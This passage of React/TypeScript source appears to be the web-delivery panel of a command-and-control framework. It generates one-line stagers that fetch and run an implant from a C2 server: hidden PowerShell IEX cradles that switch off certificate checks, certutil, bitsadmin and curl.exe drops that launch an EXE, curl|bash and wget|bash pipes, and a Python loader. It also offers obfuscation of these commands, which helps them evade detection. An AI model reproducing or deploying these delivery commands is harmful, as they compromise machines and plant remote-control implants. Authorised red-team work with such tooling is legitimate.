    "[Net.ServicePointManager]::ServerCertificateValidationCallback={param($a,$b,$c,$d)[bool]1};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;"

  const winEntries = useMemo<WinEntry[]>(() => {
    const rnd = () => Math.random().toString(16).slice(2, 8)
    const u = `${WIN_DROP_DIR}\\u${rnd()}.exe`
    const b = `${WIN_DROP_DIR}\\b${rnd()}.exe`
    const c = `${WIN_DROP_DIR}\\c${rnd()}.exe`
    return [
      {
        id: 'ps-cmd',
        label: t('PowerShell · cmd / 运行（推荐）'),
        short: 'PS/cmd',
        core: `powershell -nop -w hidden -c "${psPre}iex((New-Object Net.WebClient).DownloadString('${scriptPs}'))"`,
        post: '',
        tail: '',
        landing: 'ps',
      },
      {
        id: 'ps-native',
        label: t('PowerShell · 已在 PS 内（单引号防 $ 展开）'),
        short: 'PS 内嵌',
        core: `powershell -nop -w hidden -c '${psPre}iex((New-Object Net.WebClient).DownloadString(''${scriptPs}''))'`,
        post: '',
        tail: '',
        landing: 'ps',
      },
      {
        id: 'ps-iwr',
        label: 'PowerShell · Invoke-WebRequest',
        short: 'IWR',
        core: `powershell -nop -w hidden -c "${psPre}iex(iwr -UseBasicParsing '${scriptPs}').Content"`,
        post: '',
        tail: '',
        landing: 'ps',
      },
      // 直拉 EXE（绕过 script 层；仍走 payload 路由，UA/arch 由服务端判定）
      //
      // 三条的**输出路径都在 `post`，不在 `core`** —— 送去混淆的只剩下载段，
      // 里面一个 `%` 都没有，所以 `%USERPROFILE%` 一定原样展开（实测 15/15）。
      {
        id: 'certutil',
        label: t('certutil 直拉 EXE'),
        short: 'certutil',
        core: `certutil -urlcache -split -f ${payloadUrl}`,
        post: ` ${u}`,
        tail: `&& start /b "" ${u}`,
        landing: 'cmd',
        warn: 'certutil 无法跳过自签证书校验（0x80072F8F），仅适用于已受信任的 HTTPS 证书。',
      },
      {
        id: 'bitsadmin',
        label: 'bitsadmin 直拉 EXE',
        short: 'bitsadmin',
        core: `bitsadmin /transfer j /download /priority foreground ${payloadUrl}`,
        post: ` ${b}`,
        tail: `& start /b "" ${b}`,
        landing: 'cmd',
        warn: 'bitsadmin 同样无法跳过自签证书校验（0x80072F0D），仅适用于受信任证书。',
      },
      {
        id: 'curl',
        label: 'curl.exe (Win10+ built-in)',
        short: 'curl.exe',
        // Win10+ 自带 curl.exe；-k 跳过自签。
        // ★ `-o` 写在 **URL 之后**：这样输出路径才能留在 post 段。
        //   实测两种顺序完全等价（都 rc=0 且落盘 76312B），不是想当然。
        core: `curl -k -L --http1.1 ${payloadUrl}`,
        post: ` -o ${c}`,
        tail: `&& start /b "" ${c}`,
        landing: 'cmd',
      },
    ]
  }, [scriptPs, payloadUrl])

  const linuxCmd = useMemo(
    () => `curl -skL --http1.1 '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxWget = useMemo(
    () => `wget --no-check-certificate -qO- '${scriptBash}' | bash`,
    [scriptBash],
  )
  const linuxPython = useMemo(
    () =>
      `python3 -c "import ssl,urllib.request,os,tempfile,subprocess;ctx=ssl._create_unverified_context();u='${payloadUrl}';p=tempfile.mktemp();open(p,'wb').write(urllib.request.urlopen(u,context=ctx).read());os.chmod(p,0o755);subprocess.Popen([p]);os.unlink(p) if False else None"`,
    [payloadUrl],
  )
  const linuxCurlDirect = useMemo(
    () => `f=/tmp/.$(head -c4 /dev/urandom|xxd -p);curl -skL --http1.1 -o "$f" '${payloadUrl}'&&chmod +x "$f"&&("$f"&);sleep 3;rm -f "$f"`,
    [payloadUrl],
  )

  async function onApply() {
    if (!listener) {
      pushToast('warn', t('请先选择监听器'))
      return
    }
    if (!scriptRoute.startsWith('/') || !payloadRoute.startsWith('/')) {
      pushToast('warn', '路由必须以 / 开头')
      return
    }
    // 校验监听与 agent 兼容。
    // 原来是 `if (l && !profile.listeners.includes(...))` —— l 查不到时整条判断直接
    // 跳过，于是服务端残留的 "http"（不存在的监听名）可以一路写进服务端配置。
    // 这是写配置前唯一一道校验，不能留"查不到就放行"的缝。
    const l = listenerList.find((x) => x.l_name === listener)
    if (!l) {
      pushToast('warn', `监听 ${listener} 不在监听器列表里，请重新选择`)
      return
    }
    if (!profile.listeners.includes(l.l_reg_name || '')) {
      pushToast('warn', `监听 ${listener} (${l.l_reg_name}) 与 agent ${agentName} 不兼容`)
      return
    }
    setBusy(true)
    try {
      await api.webDeliveryConfig({
        script_route: scriptRoute.trim(),
        payload_route: payloadRoute.trim(),
        listener,
        agent_name: agentName,
        format,
        sleep,
        jitter: Number(jitter) || 0,
        cache_ttl_min: Number(cacheTtl) || 0,
        c2_host_url: c2Host.trim(),
        arch: arch || '',
      } as any)
      pushToast('ok', t('Web Delivery 配置已应用'))
      pushLog('ok', `WebDelivery 已同步 listener=${listener} agent=${agentName} format=${format} arch=${arch || 'auto'}`)
      await loadStatus()
    } catch (e: any) {
      const msg = e?.message || String(e)
      pushToast('err', `应用失败: ${msg}`)
      pushLog('err', `WebDelivery config: ${msg}`)
      if (/404|not found|no route/i.test(msg)) setPluginMissing(true)
    } finally {
      setBusy(false)
    }
  }

  async function copy(text: string, label: string, key = '') {
    const ok = await copyText(text)
    if (ok && key) {
      setCopiedKey(key)
      if (copyTimer.current) window.clearTimeout(copyTimer.current)
      copyTimer.current = window.setTimeout(() => setCopiedKey(''), 1500)
    }
    pushToast(ok ? 'ok' : 'err', ok ? `已复制${label}` : t('复制失败'))
  }

  function jumpTo(id: 'generate' | 'listeners' | 'sessions') {
    if (id !== 'generate') onClose?.()
    setTab(id)
    openUiTab(id)
  }

  /**
   * 生成一条投递命令的混淆变体。
   *
   * 只送 `core` —— `cmd /c "…"` 外壳和后面的 `&& start /b "" …` 留在本地。原因是
   * 上游拿第一个词去查 `models/<词>.json`，而 models/ 里**没有 cmd.json**，
   * 带外壳送进去只会换回一句「command 'cmd' could not be found」。
   *
   * 变体逐条过 obfVariantIssue，**只标注、不丢弃** —— 插件对上游返回值零校验，
   * 但替操作员扔掉坏变体也不对：那样他就看不见「有风险长什么样」，
   * 每条都标出来 + 写明原因，比悄悄减员有用。
   */
  async function runAxf(e: WinEntry) {
    setAxfState((m) => ({ ...m, [e.id]: 'loading' }))
    try {
      const r = await api.argFuscatorGenerate({ command: e.core, platform: 'windows', n: axfMeta.n })
      const all = (Array.isArray(r?.variants) ? r.variants : []).filter((v) => v && v.trim())
      const issues = all.map((v) => obfVariantIssue(e.core, v))
      setAxfState((m) => ({
        ...m,
        [e.id]: {
          variants: all,
          issues,
          ms: typeof r?.ms === 'number' ? r.ms : null,
          err: '',
        },
      }))
      const bad = issues.filter(Boolean).length
      if (!all.length) pushToast('warn', `${e.short}：服务端没有返回任何变体`)
      else if (bad) pushToast('warn', `${e.short}：${all.length} 个变体里有 ${bad} 个已标注风险`)
      else pushLog('ok', `参数混淆 ${e.short}：${all.length} 个变体，逐条校验通过`)
    } catch (err: any) {
      setAxfState((m) => ({
        ...m,
        [e.id]: { variants: [], issues: [], ms: null, err: err?.message || String(err) },
      }))
      pushLog('err', `参数混淆 ${e.short}: ${err?.message || err}`)
    }
  }

  /** 组装一条命令的混淆控件属性；第一个词不在模型表里就禁用并写明原因。 */
  function axfFor(e: WinEntry) {
    const tok = firstToken(e.core)
    // cmds 为空 = 清单没拿到（老版本插件），此时不拦，交给服务端报错
    const ok = axfMeta.ready && (axfMeta.cmds.size === 0 || axfMeta.cmds.has(tok.toLowerCase()))
    return {
      landing: e.landing,
      state: axfState[e.id],
      disabled: !ok,
      disabledReason: axfMeta.ready
        ? `${tok} 不在服务端的 ${axfMeta.cmds.size} 个参数模型里，混淆一定失败`
        : axfMeta.reason,
      onRun: () => { runAxf(e).catch(() => {}) },
      onCopyVariant: (v: string, i: number) => copy(variantCommand(e, v), ` ${e.short} ${t('variant')} ${i + 1}`),
      finalText: (v: string) => variantCommand(e, v),
    }
  }

  const selectedListener = compatible.find((l) => l.l_name === listener) || listenerList.find((l) => l.l_name === listener)
  const showWin = agentName === 'beacon' || agentName === 'gopher' || agentName === 'kharon'
  const showUnix = agentName === 'linux' || agentName === 'macos' || agentName === 'gopher'
  void selectedListener

  const isDirty = !!serverSnap && (
    scriptRoute.trim() !== serverSnap.scriptRoute ||
    payloadRoute.trim() !== serverSnap.payloadRoute ||
    listener !== serverSnap.listener ||
    agentName !== serverSnap.agentName ||
    format !== serverSnap.format ||
    arch !== serverSnap.arch ||
    sleep !== serverSnap.sleep ||
    Number(jitter) !== serverSnap.jitter ||
    Number(cacheTtl) !== serverSnap.cacheTtl ||
    c2Host.trim() !== serverSnap.c2Host
  )

  const effectiveOs: 'win' | 'unix' = showWin && !showUnix
    ? 'win'
    : !showWin && showUnix
      ? 'unix'
      : methodOs

  const winMethods = useMemo(() => [
    { id: 'ps' as const, prompt: 'PS>', promptCls: 'ax-prompt-ps', title: 'PowerShell 无文件', sub: '内存 IEX · 推荐', tag: '无文件' },
    { id: 'certutil' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'certutil 直拉 EXE', sub: 'CMD 下载落地运行', tag: '直拉' },
    { id: 'bitsadmin' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'bitsadmin 直拉 EXE', sub: '后台任务拉取执行', tag: '直拉' },
    { id: 'curl' as const, prompt: 'CMD>', promptCls: 'ax-prompt-cmd', title: 'curl.exe 直拉 EXE', sub: 'Win10+ 内置客户端', tag: '直拉' },
  ], [])

  const unixMethods = useMemo(() => [
    { id: 'lin-curl' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'curl | bash', sub: '管道流式执行 · 推荐', tag: '推荐', value: linuxCmd, copyLabel: ' curl|bash' },
    { id: 'lin-wget' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'wget | bash', sub: 'Wget 管道执行', tag: 'WGET', value: linuxWget, copyLabel: ' wget|bash' },
    { id: 'lin-direct' as const, prompt: '$', promptCls: 'ax-prompt-sh', title: 'curl 直拉二进制', sub: '落地加权运行后清理', tag: '直拉', value: linuxCurlDirect, copyLabel: ' curl pull' },
    { id: 'lin-py' as const, prompt: 'PY>', promptCls: 'ax-prompt-py', title: 'python3 直拉', sub: 'Python 标准库拉取', tag: 'PY3', value: linuxPython, copyLabel: ' python3' },
  ], [linuxCmd, linuxWget, linuxCurlDirect, linuxPython])

  const activeWinEntry = useMemo(() => {
    const id = winMethod === 'ps' ? psVariant : winMethod
    return winEntries.find((e) => e.id === id) || winEntries[0]
  }, [winMethod, psVariant, winEntries])

  const activeUnixItem = useMemo(
    () => unixMethods.find((m) => m.id === unixMethod) || unixMethods[0],
    [unixMethods, unixMethod],
  )

  const activeHero = useMemo(() => {
    if (effectiveOs === 'win' && activeWinEntry) {
      return {
        id: activeWinEntry.id,
        prompt: activeWinEntry.landing === 'ps' ? 'PS>' : 'CMD>',
        promptCls: activeWinEntry.landing === 'ps' ? 'ax-prompt-ps' : 'ax-prompt-cmd',
        title: activeWinEntry.landing === 'ps' ? 'PowerShell 无文件加载' : activeWinEntry.label,
        cmd: entryCommand(activeWinEntry),
        copySuffix: ' ' + activeWinEntry.short,
        warn: activeWinEntry.warn,
        axf: axfFor(activeWinEntry),
      }
    }
    return {
      id: activeUnixItem.id,
      prompt: activeUnixItem.prompt,
      promptCls: activeUnixItem.promptCls,
      title: activeUnixItem.title,
      cmd: activeUnixItem.value,
      copySuffix: activeUnixItem.copyLabel,
      warn: undefined,
      axf: undefined,
    }
  }, [effectiveOs, activeWinEntry, activeUnixItem, axfMeta, axfState])

  const shortAgentLabel = (ag: string) => (
    ag === 'beacon' ? 'Beacon'
      : ag === 'kharon' ? 'Kharon'
        : ag === 'linux' ? 'Linux'
          : ag === 'macos' ? 'macOS'
            : 'Gopher'
  )

  return (
    <div className="ax-studio ax-wd">
      <header className="ax-header">
        <div className="ax-header-left">
          <span className="ax-emblem">
            <DeliveryEmblem />
          </span>
          <div className="ax-hd-titles">
            <h2 className="ax-title">{t('一键投递')}</h2>
            <span className="ax-sub mono">
              {shortAgentLabel(agentName)} · {listener || t('待选监听')} · {format} · {arch || 'auto'}
            </span>
          </div>
          <span
            className={`ax-pill ${
              pluginMissing ? 'warn' : isDirty ? 'dirty' : loaded ? 'ok' : ''
            }`}
          >
            <i className="dot" />
            <span>
              {pluginMissing
                ? '插件未加载'
                : isDirty
                  ? '有未同步修改 · 请点击应用'
                  : loaded
                    ? `已同步 · 缓存 ${serverSnap?.cacheEntries ?? 0} 条`
                    : '连接中'}
            </span>
          </span>
        </div>

        <div className="ax-header-right">
          <button type="button" className="ax-btn" onClick={() => jumpTo('generate')}>
            ← {t('生成载荷')}
          </button>
          <button type="button" className="ax-btn" disabled={busy} onClick={() => loadStatus()}>
            {t('刷新状态')}
          </button>
          <PageTips id="delivery">
            <p>{t('一键上线：为每个监听器生成单行命令，目标机执行即回连。')}</p>
            <p>{t('目标机必须能')}<b>{t('直连')}</b>{t('此处的 C2 地址。')}</p>
            <p>{t('修改路由、Agent 或构建参数后，需点击底部「应用并同步配置」生效。')}</p>
          </PageTips>
          {onClose && (
            <button type="button" className="ax-close-btn" title="关闭窗口 (Esc)" onClick={onClose}>
              ×
            </button>
          )}
        </div>
      </header>

      <div className="ax-wd-body">
        <aside className="ax-sidebar">
          <div className="ax-side-scroll">
            {pluginMissing && (
              <div className="ax-callout warn">
                <span>服务端未加载 <b>webdelivery</b> 插件。</span>
              </div>
            )}

            <section className="ax-side-sec">
              <div className="ax-sec-hd">
                <span>目标 Agent 与兼容监听器</span>
                <span className="mono">{compatible.length} 可用</span>
              </div>
              <div className="ax-seg-track grid-5">
                {AGENT_PROFILES.map((p) => (
                  <button
                    key={p.agent}
                    type="button"
                    className={`ax-seg-btn ${agentName === p.agent ? 'active' : ''}`}
                    title={p.label}
                    onClick={() => {
                      setAgentName(p.agent)
                      if (p.agent === 'linux' || p.agent === 'macos') setMethodOs('unix')
                      else if (p.agent === 'beacon' || p.agent === 'kharon') setMethodOs('win')
                      if (p.agent === 'beacon') setFormat('Exe')
                      else if (p.agent === 'gopher') setFormat('Binary EXE')
                      else setFormat(p.formats.find((f) => f.includes('ELF')) || p.formats[0])
                      setArch('')
                    }}
                  >
                    {shortAgentLabel(p.agent)}
                  </button>
                ))}
              </div>

              {compatible.length === 0 ? (
                <div className="ax-callout warn">
                  <span>暂无兼容 {profile.label} 的监听器</span>
                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => jumpTo('listeners')}>
                    去创建 →
                  </button>
                </div>
              ) : (
                <div className="ax-wd-lis-list">
                  {compatible.map((l) => {
                    const live = String(l.l_status).toLowerCase().includes('listen')
                    return (
                      <button
                        key={l.l_name}
                        type="button"
                        className={`ax-lis-row ${listener === l.l_name ? 'active' : ''}`}
                        onClick={() => setListener(l.l_name)}
                      >
                        <span className={`ax-lis-dot ${live ? 'on' : ''}`} />
                        <div className="ax-lis-meta">
                          <b className="mono">{l.l_name}</b>
                          <span className="mono">{l.l_bind_host || '0.0.0.0'}:{l.l_bind_port || '-'} · {l.l_status || '-'}</span>
                        </div>
                        <span className="ax-proto-chip mono">{shortProto(l.l_reg_name)}</span>
                      </button>
                    )
                  })}
                </div>
              )}
            </section>

            <section className="ax-side-sec">
              <div className="ax-sec-hd">
                <span>投递方式</span>
                {showWin && showUnix ? (
                  <div className="ax-seg-track" style={{ padding: 2 }}>
                    <button
                      type="button"
                      className={`ax-seg-btn ${methodOs === 'win' ? 'active' : ''}`}
                      style={{ height: '19px', padding: '0 6px', fontSize: '10px' }}
                      onClick={() => setMethodOs('win')}
                    >
                      Windows
                    </button>
                    <button
                      type="button"
                      className={`ax-seg-btn ${methodOs === 'unix' ? 'active' : ''}`}
                      style={{ height: '19px', padding: '0 6px', fontSize: '10px' }}
                      onClick={() => setMethodOs('unix')}
                    >
                      Unix
                    </button>
                  </div>
                ) : (
                  <span className="mono">{effectiveOs === 'win' ? 'Windows' : 'Linux / macOS'}</span>
                )}
              </div>

              <div className="ax-method-list">
                {effectiveOs === 'win'
                  ? winMethods.map((m) => (
                      <button
                        key={m.id}
                        type="button"
                        className={`ax-method-row ${winMethod === m.id ? 'active' : ''}`}
                        onClick={() => setWinMethod(m.id)}
                      >
                        <span className={`ax-prompt-badge ${m.promptCls} mono`}>{m.prompt}</span>
                        <div className="ax-method-meta">
                          <b>{m.title}</b>
                          <span>{m.sub}</span>
                        </div>
                        <span className="ax-plat-tag">{m.tag}</span>
                      </button>
                    ))
                  : unixMethods.map((m) => (
                      <button
                        key={m.id}
                        type="button"
                        className={`ax-method-row ${unixMethod === m.id ? 'active' : ''}`}
                        onClick={() => setUnixMethod(m.id)}
                      >
                        <span className={`ax-prompt-badge ${m.promptCls} mono`}>{m.prompt}</span>
                        <div className="ax-method-meta">
                          <b>{m.title}</b>
                          <span>{m.sub}</span>
                        </div>
                        <span className="ax-plat-tag">{m.tag}</span>
                      </button>
                    ))}
              </div>
            </section>
          </div>
        </aside>

        <main className="ax-main-col">
          <div className="ax-main-scroll">
            <section className="ax-wd-hero">
              <div className="ax-wd-hero-hd">
                <div className="ax-wd-hero-title">
                  <span className={`ax-prompt-badge ${activeHero.promptCls} mono`}>{activeHero.prompt}</span>
                  <b>{activeHero.title}</b>
                  {effectiveOs === 'win' && winMethod === 'ps' && (
                    <div className="ax-seg-track">
                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-cmd' ? 'active' : ''}`} onClick={() => setPsVariant('ps-cmd')}>
                        cmd / 运行
                      </button>
                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-native' ? 'active' : ''}`} onClick={() => setPsVariant('ps-native')}>
                        PS 内单引号
                      </button>
                      <button type="button" className={`ax-seg-btn ${psVariant === 'ps-iwr' ? 'active' : ''}`} onClick={() => setPsVariant('ps-iwr')}>
                        Invoke-WebRequest
                      </button>
                    </div>
                  )}
                </div>

                <div className="ax-wd-hero-acts">
                  {activeHero.axf && (
                    <button
                      type="button"
                      className="ax-btn"
                      disabled={activeHero.axf.state === 'loading' || activeHero.axf.disabled}
                      title={activeHero.axf.disabled ? activeHero.axf.disabledReason : '生成语义等价、字面不同的混淆变体'}
                      onClick={activeHero.axf.onRun}
                    >
                      {activeHero.axf.state === 'loading' ? '混淆中…' : t('参数混淆')}
                    </button>
                  )}
                  <button
                    type="button"
                    className={`ax-btn-primary compact ${copiedKey === activeHero.id ? 'copied' : ''}`}
                    onClick={() => copy(activeHero.cmd, activeHero.copySuffix, activeHero.id)}
                  >
                    {copiedKey === activeHero.id ? '已复制 ✓' : '复制命令'}
                  </button>
                </div>
              </div>

              <pre className="wd-cmd ax-wd-hero-code mono">{renderHighlightedCmd(activeHero.cmd)}</pre>

              {activeHero.warn && <div className="ax-warn-callout">{activeHero.warn}</div>}

              <div className="ax-wd-hero-eps">
                <div className="ax-ep-cell">
                  <span className="ax-ep-lbl">Script 入口</span>
                  <code className="mono">{scriptUrl || '…'}</code>
                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => copy(scriptUrl, ' Script URL', 'ep-s')}>
                    {copiedKey === 'ep-s' ? '已复制 ✓' : '复制'}
                  </button>
                </div>
                <div className="ax-ep-cell">
                  <span className="ax-ep-lbl payload">Payload 直链</span>
                  <code className="mono">{payloadUrl || '…'}</code>
                  <button type="button" className="ax-btn ax-btn-sm" onClick={() => copy(payloadUrl, ' Payload URL', 'ep-p')}>
                    {copiedKey === 'ep-p' ? '已复制 ✓' : '复制'}
                  </button>
                </div>
              </div>

              {activeHero.axf && <AxfVariantsBox axf={activeHero.axf} />}
            </section>

            <section className="ax-group-card">
              <div className="ax-group-card-hd">
                <b>投递与载荷配置</b>
                <div className="ax-wd-hero-acts">
                  <span className="ax-pill mono">{agentName} · {format} · {arch || 'UA auto'}</span>
                  <button
                    type="button"
                    className={`ax-btn-ghost ax-btn-sm ${showTechNotes ? 'active' : ''}`}
                    onClick={() => setShowTechNotes((v) => !v)}
                  >
                    {showTechNotes ? '收起说明' : '投递说明'}
                  </button>
                </div>
              </div>

              {showTechNotes && (
                <div className="ax-callout" style={{ flexDirection: 'column', alignItems: 'flex-start', gap: 4 }}>
                  <div>
                    <b>多平台分发逻辑：</b>服务端依据请求 <code>UA</code>、<code>?d=</code> 或 <code>?arch=</code> 自动编译并返回对应载荷（beacon 仅 Windows · gopher 支持全平台 · linux/macos 按 Native 分发）。
                  </div>
                  <div>
                    <b>ArgFuscator 参数混淆：</b>仅对下载命令主体做语法改写（输出路径保留在 <code>%USERPROFILE%</code> 外层），返回后自动比对 URL 语义一致性并标红异常变体。
                  </div>
                </div>
              )}

              <div className="ax-wd-route-row">
                <label className="ax-field">
                  <span className="ax-field-lbl">C2 Host URL（目标机可达地址）</span>
                  <input
                    className="mono"
                    value={c2Host}
                    onChange={(e) => setC2Host(e.target.value)}
                    placeholder={t('https://<teamserver 地址>:<端口>/api')}
                  />
                </label>
                <label className="ax-field">
                  <span className="ax-field-lbl">{t('Script 路由')}</span>
                  <input className="mono" value={scriptRoute} onChange={(e) => setScriptRoute(e.target.value)} placeholder="/deliver" />
                </label>
                <label className="ax-field">
                  <span className="ax-field-lbl">{t('Payload 路由')}</span>
                  <input className="mono" value={payloadRoute} onChange={(e) => setPayloadRoute(e.target.value)} placeholder="/deliver/payload" />
                </label>
              </div>

              <div className="ax-wd-param-row">
                <div className="ax-ctrl-grp">
                  <div className="ax-ctrl-lbl"><span>{t('格式')}</span></div>
                  <div className="ax-seg-track">
                    {formats.map((f) => (
                      <button key={f} type="button" className={`ax-seg-btn ${format === f ? 'active' : ''}`} onClick={() => setFormat(f)}>
                        {f}
                      </button>
                    ))}
                  </div>
                </div>

                <div className="ax-ctrl-grp">
                  <div className="ax-ctrl-lbl"><span>目标架构（留空按 UA）</span></div>
                  <div className="ax-seg-track">
                    <button type="button" className={`ax-seg-btn ${!arch ? 'active' : ''}`} onClick={() => setArch('')}>{t('自动')}</button>
                    {arches.map((a) => (
                      <button key={a} type="button" className={`ax-seg-btn ${arch === a ? 'active' : ''}`} onClick={() => setArch(a)}>{a}</button>
                    ))}
                  </div>
                </div>

                <label className="ax-ctrl-grp">
                  <span className="ax-ctrl-lbl">{sleepSpec.kind === 'sleep' ? 'Sleep' : t('重连（秒）')}</span>
                  <input className="mono ax-wd-sleep-in" value={sleep} onChange={(e) => setSleep(e.target.value)} placeholder={sleepSpec.def} />
                </label>

                {sleepSpec.kind === 'sleep' && (
                  <label className="ax-ctrl-grp">
                    <span className="ax-ctrl-lbl">Jitter</span>
                    <div className="ax-unit-input ax-wd-num-wrap">
                      <input
                        type="number"
                        className="mono"
                        min={0}
                        max={100}
                        value={jitter}
                        onChange={(e) => setJitter(Number(e.target.value))}
                        title={t('抖动%')}
                      />
                      <span className="ax-unit">%</span>
                    </div>
                  </label>
                )}

                <label className="ax-ctrl-grp">
                  <span className="ax-ctrl-lbl">缓存 TTL</span>
                  <div className="ax-unit-input ax-wd-num-wrap">
                    <input
                      type="number"
                      className="mono"
                      min={0}
                      max={1440}
                      value={cacheTtl}
                      onChange={(e) => setCacheTtl(Number(e.target.value))}
                      title="分钟，0=不缓存"
                    />
                    <span className="ax-unit">分</span>
                  </div>
                </label>
              </div>

              {agentName === 'beacon' && format === 'Stager' && (
                <div className="ax-callout">
                  <span>Stager 模式经 Payload 路由拉取二阶段载荷；日常投递建议优选 Exe。</span>
                </div>
              )}
            </section>
          </div>
        </main>
      </div>

      {/* Full-Width 46px Native Qt Dialog Footer (Matches .qt-lst-foot 1:1) */}
      <footer className="ax-dock">
        <div className="ax-dock-left">
          <span className="ax-dock-meta mono">
            目标机 → {scriptRoute || '/deliver'} → {payloadRoute || '/deliver/payload'}
          </span>
          <span className="ax-pill mono">
            服务端：{serverSnap ? `${serverSnap.listener} · ${serverSnap.agentName} · ${serverSnap.format}` : statusText}
          </span>
        </div>

        <div className="ax-dock-right">
          <button type="button" className="ax-btn" onClick={() => jumpTo('listeners')}>管理监听器</button>
          <button type="button" className="ax-btn" onClick={() => jumpTo('sessions')}>查看主机</button>
          <button
            type="button"
            className="ax-btn-primary"
            disabled={busy || !listener}
            onClick={onApply}
          >
            {busy ? '同步中…' : isDirty ? '应用并同步改动' : '应用并同步配置'}
          </button>
        </div>
      </footer>
    </div>
  )
}
